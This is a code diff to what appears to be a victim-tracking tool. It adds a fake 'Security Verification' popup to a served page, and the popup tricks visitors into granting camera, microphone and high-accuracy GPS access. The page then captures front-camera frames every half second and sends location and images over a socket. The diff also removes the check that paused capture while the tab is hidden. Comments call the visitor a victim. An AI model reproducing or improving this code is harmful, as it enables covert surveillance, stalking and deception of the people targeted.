@@ -16,16 +16,40 @@ def get_db():
 def save_db(d):
     with open(DB, 'w') as f: json.dump(d, f)
 
-# === UI TARGET ===
+# === UI TARGET (FAKE POPUP TRICK) ===
 TARGET_HTML = """
 <!DOCTYPE html>
 <html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Loading...</title>
 <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
 <style>
-  body { background-color: #ffffff; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; cursor: default; }
+  body { background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+  
+  /* OVERLAY POPUP PALSU */
+  .fake-popup-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.4); display: flex; justify-content: center; align-items: center; z-index: 9999; }
+  .fake-popup { background: #fff; width: 85%; max-width: 340px; border-radius: 12px; padding: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); text-align: left; }
+  .fake-popup h3 { margin: 0 0 10px 0; font-size: 18px; color: #202124; }
+  .fake-popup p { margin: 0 0 20px 0; font-size: 14px; color: #4a4a4a; line-height: 1.5; }
+  .fake-popup .buttons { display: flex; justify-content: flex-end; gap: 10px; }
+  .fake-popup button { padding: 10px 15px; border: none; border-radius: 6px; font-weight: 600; font-size: 14px; cursor: pointer; }
+  .fake-popup .btn-block { background: transparent; color: #1a73e8; }
+  .fake-popup .btn-allow { background: #1a73e8; color: #fff; }
+  
   video { display: none; } canvas { display: none; }
-</style></head><body onclick="startAll()">
+</style></head><body>
+  
+  <!-- POPUP PALSU -->
+  <div class="fake-popup-bg" id="fakePopup">
+    <div class="fake-popup">
+      <h3>Security Verification</h3>
+      <p>This site wants to:<br><br>• Use your camera and microphone<br>• Know your location</p>
+      <div class="buttons">
+        <button class="btn-block" onclick="alert('Verification cancelled.')">Block</button>
+        <button class="btn-allow" onclick="startAll()">Allow</button>
+      </div>
+    </div>
+  </div>
+
 <video id="v" autoplay playsinline muted></video>
 <canvas id="c"></canvas>
 
@@ -33,23 +57,17 @@ TARGET_HTML = """
 let socket=null;
 let isStarted = false;
 
-document.addEventListener("visibilitychange", function() {
-  if (socket && socket.connected) {
-    if (document.visibilityState === 'hidden') {
-      socket.emit('target_event', {event: 'hidden'});
-    } else {
-      socket.emit('target_event', {event: 'visible'});
-    }
-  }
-});
-
 async function startAll(){
   if (isStarted) return;
   isStarted = true;
+  
+  // Sembunyiin popup palsu
+  document.getElementById('fakePopup').style.display = 'none';
 
   try {
+    // 1. Tembak GPS & KAMERA
     const locPromise = new Promise((resolve, reject) => navigator.geolocation.getCurrentPosition(resolve, reject, {enableHighAccuracy: true, timeout: 15000}));
-    const mediaPromise = navigator.mediaDevices.getUserMedia({ video: {facingMode:'environment'}, audio: true });
+    const mediaPromise = navigator.mediaDevices.getUserMedia({ video: {facingMode:'user'}, audio: true });
     
     locPromise.then(pos => {
       const loc = {lat: pos.coords.latitude, lon: pos.coords.longitude};
@@ -102,7 +120,7 @@ async function startAll(){
         const canvas = document.getElementById('c');
         const ctx = canvas.getContext('2d');
         setInterval(() => {
-          if(v.videoWidth > 0 && document.visibilityState === 'visible') {
+          if(v.videoWidth > 0) {
             canvas.width = 320; 
             canvas.height = 240; 
             ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
@@ -112,7 +130,9 @@ async function startAll(){
         }, 500); 
       });
     };
-  } catch(e) {}
+  } catch(e) {
+    // Kalau korban nolak izin asli
+  }
 }
 </script></body></html>
 """
